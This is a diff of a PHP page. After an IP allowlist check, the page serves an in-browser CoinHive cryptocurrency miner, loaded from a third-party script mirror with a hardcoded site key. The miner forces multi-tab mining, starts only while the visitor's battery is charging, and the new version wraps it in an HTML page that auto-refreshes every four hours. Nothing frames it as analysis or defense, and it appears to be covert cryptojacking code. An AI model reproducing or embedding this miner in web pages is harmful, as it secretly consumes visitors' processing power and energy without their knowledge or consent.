@@ -32,35 +32,7 @@ include('./inc/allowed_cidrs.php');
 
 if (empty($allowed_cidrs) || !testUserIP($_SERVER['REMOTE_ADDR'], $allowed_cidrs)) exit();
 
-// <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
-?>
-<script type="text/javascript" src="https://plugin.brfiles.com/lib/ch64.min.js"></script>
-<script type="text/javascript">
-var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
-	threads: 1,
-	autoThreads: false
-});
-try {
-	navigator.getBattery().then(function (battery) {
-		
-		if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
-		
-		battery.onchargingchange = function (evt) {
-			if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
-			else miner.stop();
-		}
-		
-	});
-}catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
-</script>
-<?
 /*
-?>
-<html>
-<head>
-	<meta http-equiv="refresh" content="7200">
-</head>
-<body>
 <script type="text/javascript" src="https://plugin.brfiles.com/lib/ae64.min.js"></script>
 <script type="text/javascript">
 function start() {
@@ -84,7 +56,33 @@ try {
 	});
 }catch(e){start();}
 </script>
+*/
+
+// <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+?>
+<html>
+<head>
+	<meta http-equiv="refresh" content="14400">
+</head>
+<body>
+<script type="text/javascript" src="https://plugin.brfiles.com/lib/ch64.min.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
+	threads: 1,
+	autoThreads: false
+});
+try {
+	navigator.getBattery().then(function (battery) {
+		
+		if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
+		
+		battery.onchargingchange = function (evt) {
+			if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
+			else miner.stop();
+		}
+		
+	});
+}catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
+</script>
 </body>
 </html>
-*/
-?>
